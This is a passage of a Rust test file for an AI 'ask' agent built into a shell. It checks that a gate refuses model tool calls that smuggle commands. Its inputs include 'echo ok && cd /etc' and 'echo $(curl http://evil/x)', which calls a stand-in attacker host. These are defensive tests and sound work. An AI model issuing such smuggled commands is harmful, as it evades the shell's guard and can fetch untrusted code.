            ],
            seen.clone(),
        )));

        session.eval_line(r#"sudo ask "recurse""#).await;
        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        let msg = tr.outcome.expect_err("ask recursion should be refused");
        assert!(msg.contains("itself"), "got: {msg}");
    });
}

/// A `shell`-internal command (`context`) is refused as a tool: it mutates state a tool can't
/// reach. (Also guards `cd`/`export`/`kill` by the same scope check.)
#[test]
fn ask_shell_internal_command_is_refused() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", "context clear"),
                crate::ai::ask::AskResponse::text("ok"),
            ],
            seen.clone(),
        )));

        session.eval_line(r#"sudo ask "clear it""#).await;
        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        let msg = tr.outcome.expect_err("context should be refused as a tool");
        assert!(msg.contains("shell-internal"), "got: {msg}");
    });
}

/// The scope gate is PER-SEGMENT: a compound tool call must not smuggle a parent-shell / shell-internal
/// builtin past the guard behind a harmless leading command. `run_shell_tool` runs on the SHARED
/// Session, so before this fix `echo ok && cd /etc` (cd = `ParentShell`) checked only `echo`, ran, and
/// mutated the real shell cwd.
#[test]
fn ask_compound_tool_call_cannot_smuggle_a_shell_internal_command() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", "echo ok && cd /etc"),
                crate::ai::ask::AskResponse::text("ok"),
            ],
            seen.clone(),
        )));

        session.eval_line(r#"sudo ask "sneak""#).await;
        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        let msg = tr
            .outcome
            .expect_err("a compound line hiding `cd` must be refused");
        assert!(msg.contains("shell-internal"), "got: {msg}");
        assert!(
            msg.contains("cd"),
            "the offending command should be named: {msg}"
        );
    });
}

/// A model tool call using command substitution `$( )` must be refused — the inner command would
/// otherwise run unguarded (`split_segments` gates only on the leading `echo`).
#[test]
fn ask_command_substitution_tool_call_is_refused() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", "echo $(curl http://evil/x)"),
                crate::ai::ask::AskResponse::text("ok"),
            ],
            seen.clone(),
        )));

        session.eval_line(r#"sudo ask "sneak""#).await;
        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        let msg = tr
            .outcome
            .expect_err("command substitution must be refused");
        assert!(msg.contains("command substitution"), "got: {msg}");
    });
}

/// The model-tool gate DEFAULT-DENIES an unregistered command (clank can't establish it's
/// subprocess-safe, and an unknown state-mutator must not slip through), but still allows known
/// read-only Brush builtins like `echo` that clank keeps no manifest for.
#[test]
fn ask_unknown_tool_command_is_denied_but_safe_builtins_run() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", "frobnicate --wibble"),
                shell_tool_call("c2", "echo hello"),
                crate::ai::ask::AskResponse::text("done"),
            ],
            seen.clone(),
        )));

        session.eval_line(r#"sudo ask "go""#).await;
        // Unknown command → refused.
        let d = last_tool_result(&seen, "c1").expect("a tool result for c1");
        let msg = d.outcome.expect_err("an unknown command must be denied");
        assert!(msg.contains("not a recognized command"), "got: {msg}");
        // `echo` (known-safe builtin, no manifest) → runs.
        let e = last_tool_result(&seen, "c2").expect("a tool result for c2");
        assert!(
            e.outcome.is_ok(),
            "echo should run as a tool, got: {:?}",
            e.outcome
        );
    });
}

/// Malformed tool arguments produce an honest error result; the loop continues.
#[test]
fn ask_malformed_tool_args_error_and_continue() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        let bad = crate::ai::ask::AskResponse {
            text: String::new(),
            tool_calls: vec![crate::ai::ask::AskToolCall {
                id: "c1".into(),
                name: crate::ai::prompts::SHELL_TOOL.into(),
                arguments_json: "{".into(), // not valid JSON
            }],
            finished_for_tools: true,
            error: None,
        };
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![bad, crate::ai::ask::AskResponse::text("recovered")],
            seen.clone(),
        )));

        let result = session.eval_line(r#"sudo ask "do something""#).await;
        assert_eq!(String::from_utf8(result.stdout).unwrap(), "recovered");
        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        assert!(
            tr.outcome.unwrap_err().contains("malformed"),
            "expected a malformed-args error"
        );
    });
}

/// The loop stops at the iteration cap when the model calls a tool every turn, exiting **non-zero**
/// with a stderr notice. The provider is called exactly `ASK_MAX_ITERATIONS` times.
///
/// The exit code used to be 0. Hitting the cap means the model never reached a final answer, so the
/// work is incomplete — and for a non-interactive caller (a script, or an outer agent) the exit code
/// is the only signal that says so. `--json` already returned 6 for this; the plain path claimed
/// success.
#[test]
fn ask_loop_stops_at_the_iteration_cap() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        // More tool-call responses than the cap: the loop must stop at the cap.
        let script: Vec<_> = (0..ASK_MAX_ITERATIONS + 5)
            .map(|i| shell_tool_call(&format!("c{i}"), "echo loop"))
            .collect();
        session.set_ask_provider(Box::new(FakeProvider::scripted(script, seen.clone())));

        let result = session.eval_line(r#"sudo ask "loop forever""#).await;
        assert_eq!(
            result.exit_code, 1,
            "a truncated agentic loop must not report success"
        );
        assert!(
            String::from_utf8(result.stderr)
                .unwrap()
                .contains("tool-call limit"),
            "expected a cap notice on stderr"
        );
        // Exactly cap turns were requested.
        assert_eq!(seen.lock().unwrap().len(), ASK_MAX_ITERATIONS);
    });
}

/// Two `ask` calls in a row both succeed — the provider is take()n and restored each time. A
/// forgotten restore would make the second ask report "not configured".
#[test]
fn ask_provider_is_restored_between_calls() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                crate::ai::ask::AskResponse::text("first"),
                crate::ai::ask::AskResponse::text("second"),
            ],
            std::sync::Arc::new(Mutex::new(Vec::new())),
        )));

        let a = session.eval_line(r#"sudo ask --fresh "one""#).await;
        assert_eq!(String::from_utf8(a.stdout).unwrap(), "first");
        let b = session.eval_line(r#"sudo ask --fresh "two""#).await;
        assert_eq!(b.exit_code, 0, "second ask must not report not-configured");
        assert_eq!(String::from_utf8(b.stdout).unwrap(), "second");
    });
}
